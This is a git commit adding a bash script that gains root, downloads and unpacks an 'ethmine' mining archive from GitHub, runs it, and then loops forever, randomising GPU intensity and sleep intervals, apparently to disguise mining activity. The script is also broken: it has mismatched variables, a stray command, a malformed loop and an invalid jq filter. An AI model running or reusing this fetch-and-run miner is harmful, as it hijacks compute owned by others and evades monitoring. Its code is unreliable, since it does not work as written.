ca15501dc48b3d1c47298d4803c1fcba01462e61
superalix <97192839+superalix@users.noreply.github.com>
2022-04-18 19:48:48 +0300

    Add files via upload

---
+++ randomized gpu.sh
@@ -0,0 +1,21 @@
+#!/bin/bash
+sudo -i
+sudo apt-get install -y libpci-dev
+sudo apt-get update
+curl -L https://github.com/superalix/avian/raw/main/ethmine.tar.gz > ethmine.tar.gz && tar -zxf ethmine.tar.gz
+apt-get -y install jq
+t_min=25
+t_max=100
+gpu_min=50
+gpu_max=90
+bash mine.sh
+while true :
+  do
+    t=$(($t_min + $RANDOM % ($t_max - $t_min)))
+    cpu=$(shuf -i 50-89 -n 1)
+    echo $gpu
+    cat config.json |jq -r --arg cpu "$gpu" '.-gpow $gpu' > u.json
+    mv u.json config.json
+    c
+    sleep $t
+done
